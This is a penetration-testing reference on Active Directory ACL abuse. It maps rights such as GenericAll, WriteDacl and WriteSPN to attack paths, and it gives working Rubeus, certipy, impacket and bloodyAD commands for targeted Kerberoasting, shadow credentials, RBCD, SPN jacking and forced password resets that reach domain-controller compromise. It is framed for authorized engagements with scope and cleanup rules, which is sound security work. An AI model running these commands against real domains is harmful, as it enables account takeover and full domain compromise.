# Active Directory ACL abuse

## Purpose

Turn graph-level ACL findings into confirmed, reproducible AD attack paths while avoiding blind permission changes.

## High-risk rights

| Right | Why it matters | Common impact |
|---|---|---|
| `GenericAll` | Full control of the object | Add member to group, reset user password, configure delegation |
| `WriteDacl` | Modify the object's DACL | Grant self `GenericAll`, then perform the intended action |
| `WriteOwner` | Take ownership, then edit DACL | Owner takeover followed by privilege grant |
| `GenericWrite` | Modify writable attributes | Shadow credentials, SPN write, logon script, delegation attributes |
| `WriteSPN` | Validated Write to servicePrincipalName | SPN Jacking (redirect KCD targets), targeted Kerberoasting |
| `ForceChangePassword` | Reset a user's password | Immediate credential takeover if target account is valuable |
| `AddMember` | Add a principal to a group | Privilege escalation through group membership |
| `AllExtendedRights` | Includes sensitive extended operations | Password reset, replication-adjacent paths depending target |

## Enumeration workflow

1. Mark every compromised user, computer, and group as owned in BloodHound.
2. Run transitive object-control queries from owned principals.
3. Filter paths to high-value targets first: privileged groups, GPOs linked to servers, tier-0 computers, service accounts, and OUs containing admin assets.
4. Re-check the specific ACE with LDAP/PowerView before execution.
5. Select the lowest-change path that proves impact.

Useful query pattern:

```cypher
MATCH p=(n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AddMember*1..]->(m)
WHERE n.owned = true
RETURN p
ORDER BY length(p) ASC
```

PowerView confirmation:

```powershell
Get-DomainObjectAcl -Identity "<target>" -ResolveGUIDs |
  Where-Object {$_.IdentityReferenceName -match "<owned-principal>"}
```

Raw LDAP validation fields:

- `nTSecurityDescriptor` — source of DACL/ACE data.
- `distinguishedName` — exact target object.
- `objectSid` — principal identity correlation.
- `member`, `memberOf`, `adminCount` — privilege and protected-object context.

## Execution paths by right

### `GenericAll` on user

Preferred proof path:

1. Confirm the user is in scope and not a protected production identity unless explicitly approved.
2. Use password reset only with a controlled test account or approved target account.
3. If password reset is too intrusive, prefer shadow credentials where certificate abuse is allowed.
4. Validate authentication with a minimal action.

Impact: account takeover, then ticket/hash use through the normal credential handoff workflow.

### `GenericAll` or `AddMember` on group

1. Confirm group membership leads to real privilege with BloodHound path expansion.
2. Add an approved controlled principal to the group.
3. Validate access to the next object.
4. Remove the membership during cleanup if rules of engagement require restoration.

Impact: role escalation through group membership.

### `WriteDacl` on high-value object

1. Back up current DACL or export object ACL evidence.
2. Grant a minimal right (`GenericAll` only if needed; otherwise `WriteMembers` or a specific extended right).
3. Perform the downstream action.
4. Restore or document the DACL change.

Impact: privilege grant without needing the target's password.

### `WriteOwner` on object

1. Take ownership.
2. Modify DACL to grant the exact needed right.
3. Perform the validated action.
4. Record ownership and DACL changes for cleanup.

Impact: owner takeover that enables DACL modification.

### `GenericWrite` on user or computer

Common paths:

- User object: add an SPN and Kerberoast the account (targeted Kerberoasting).
- User object: configure shadow credentials (`msDS-KeyCredentialLink`) when AD CS and PKINIT are usable.
- Computer object: configure resource-based constrained delegation when machine-account quota and delegation settings allow it.
- Computer object: modify `servicePrincipalName` for SPN Jacking (see below).
- GPO object: modify linked policy only in explicitly authorized scope.

```powershell
# Targeted Kerberoasting: set fake SPN on target user, then roast it
Set-DomainObject -Identity <target_user> -SET @{serviceprincipalname='fake/LEGIT'} -Credential $Cred
.\Rubeus.exe kerberoast /user:<target_user> /nowrap
# After cracking: clean up the SPN
Set-DomainObject -Identity <target_user> -Clear serviceprincipalname -Credential $Cred

# Shadow Credentials via GenericWrite
certipy shadow auto -u attacker@domain.local -p pass -account <target_user> -dc-ip <dc_ip>

# RBCD via GenericWrite on computer
impacket-addcomputer domain.local/user:pass -computer-name 'EVIL$' -computer-pass 'P@ss123!'
impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<target_computer>$' -dc-ip <dc_ip> -action write 'domain.local/user:pass'
impacket-getST -spn cifs/<target_computer> -impersonate Administrator -dc-ip <dc_ip> 'domain.local/EVIL$:P@ss123!'
```

### `WriteSPN` (Validated Write to servicePrincipalName)

Separate from GenericWrite: the "Validated Write to servicePrincipalName" permission is a specific property right that allows modifying SPNs without full GenericWrite. Often granted to helpdesk groups, server operators, or via delegation on OUs containing computer objects.

**SPN Jacking attack** — when combined with a Constrained Delegation account:

1. Account A has `msDS-AllowedToDelegateTo: HTTP/TARGET.domain.local`
2. `HTTP/TARGET.domain.local` is currently registered on MACHINE_X$
3. Attacker has WriteSPN on MACHINE_X$ AND on a higher-value target (e.g., DC01$)
4. Move the SPN: remove from MACHINE_X$, add to DC01$
5. KDC now resolves `HTTP/TARGET.domain.local` → DC01$ → encrypts S4U2Proxy TGS with DC01$ key
6. Use `-altservice CIFS/DC01.domain.local` → full access on DC

```bash
# Enumerate WriteSPN rights (dacledit or bloodhound)
dacledit.py -target 'MACHINE_X$' domain.local/user:pass -dc-ip <dc_ip> -action read | grep -i spn
# Look for: WriteProperty on servicePrincipalName, or ValidatedWrite, or GenericWrite

# Remove SPN from source
bloodyAD -u attacker -p pass -d domain.local --host <dc_ip> \
  set object 'MACHINE_X$' servicePrincipalName -v 'HTTP/TARGET.domain.local' --remove

# Add SPN to high-value target
bloodyAD -u attacker -p pass -d domain.local --host <dc_ip> \
  set object 'DC01$' servicePrincipalName -v 'HTTP/TARGET.domain.local' --append

# S4U2Proxy with altservice → domain compromise
impacket-getST -spn HTTP/TARGET.domain.local -impersonate administrator \
  -altservice CIFS/DC01.domain.local domain.local/svc_kcd:pass -dc-ip <dc_ip>
```

**Constraints**:
- AD enforces SPN uniqueness per forest — must REMOVE before ADD (otherwise `constraintViolation`)
- If target SPN is in use by a production service, removing it breaks that service (noise)
- Works best when the delegation target SPN is on a low-value or inactive machine

→ Full SPN Jacking technique details: `references/kerberos-attacks.md` §SPN Jacking.

### `ForceChangePassword` on user

Immediate credential takeover. Particularly impactful when:
- Target user has Constrained Delegation configured
- Target user is in a privileged group or has further ACL paths
- Combined with SPN Jacking: reset password of KCD account → control the delegation

```bash
# Linux
net rpc password '<target_user>' 'NewPass123!' -U 'domain.local/attacker%pass' -S <dc_ip>
# Or: bloodyAD
bloodyAD -u attacker -p pass -d domain.local --host <dc_ip> set password '<target_user>' 'NewPass123!'
# Or: rpcclient
rpcclient -U 'domain.local/attacker%pass' <dc_ip> -c "setuserinfo2 <target_user> 23 'NewPass123!'"
```

## Attack path selection

Prefer paths in this order:

1. Read-only proof that demonstrates exploitable rights.
2. Controlled test-principal modification.
3. Reversible membership or attribute change.
4. Password reset or broad DACL change only when approved.

Avoid changing tier-0 identities unless the engagement explicitly allows it.

## Evidence requirements

- Source principal, target object, right, and inheritance path.
- Independent confirmation outside the graph tool.
- Exact action performed and its result.
- Cleanup/restoration state where applicable.

## Common pitfalls

- Trusting inherited graph edges without verifying the live DACL.
- Abusing a path that only reaches a low-value group with no downstream privilege.
- Modifying protected objects affected by AdminSDHolder without understanding propagation.
- Forgetting that inheritance can be blocked at OU/object level.
- Leaving added group members or DACL changes behind unintentionally.
